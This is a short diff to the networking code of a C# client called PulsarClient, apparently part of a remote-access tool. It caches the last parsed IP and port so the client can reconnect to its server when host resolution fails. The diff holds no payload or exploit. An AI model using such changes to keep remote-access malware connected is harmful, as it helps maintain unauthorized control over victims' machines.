@@ -46,6 +46,9 @@ namespace Pulsar.Client.Networking
         /// </summary>
         private readonly CancellationToken _token;
 
+        // Store the last resolved host (IP and Port)
+        private Host _lastResolvedHost;
+
         /// <summary>
         /// Initializes a new instance of the <see cref="PulsarClient"/> class.
         /// </summary>
@@ -144,7 +147,7 @@ namespace Pulsar.Client.Networking
 
                             if (Uri.TryCreate(content, UriKind.Absolute, out Uri nestedUri))
                             {
-                                return ResolveHost(content);
+                                return ResolveHost(content); 
                             }
 
                             string[] parts = content.Split(':');
@@ -153,7 +156,8 @@ namespace Pulsar.Client.Networking
                                 ushort.TryParse(parts[1].Trim(), out ushort port))
                             {
                                 Debug.WriteLine($"Parsed IP: {ip}, Port: {port}");
-                                return new Host { IpAddress = ip, Port = port };
+                                _lastResolvedHost = new Host { IpAddress = ip, Port = port };
+                                return _lastResolvedHost;
                             }
                             else
                             {
@@ -174,7 +178,8 @@ namespace Pulsar.Client.Networking
                         ushort.TryParse(parts[1].Trim(), out ushort port))
                     {
                         Debug.WriteLine($"Parsed direct IP: {ip}, Port: {port}");
-                        return new Host { IpAddress = ip, Port = port };
+                        _lastResolvedHost = new Host { IpAddress = ip, Port = port };
+                        return _lastResolvedHost;
                     }
                     else
                     {
@@ -186,8 +191,14 @@ namespace Pulsar.Client.Networking
             {
                 Debug.WriteLine($"Host resolution error: {ex.Message}");
             }
+            if (_lastResolvedHost != null)
+            {
+                Debug.WriteLine($"Using last resolved host: {_lastResolvedHost.IpAddress}:{_lastResolvedHost.Port}");
+                return _lastResolvedHost;
+            }
             return null;
         }
+
 
         private void OnClientRead(Client client, IMessage message, int messageLength)
         {
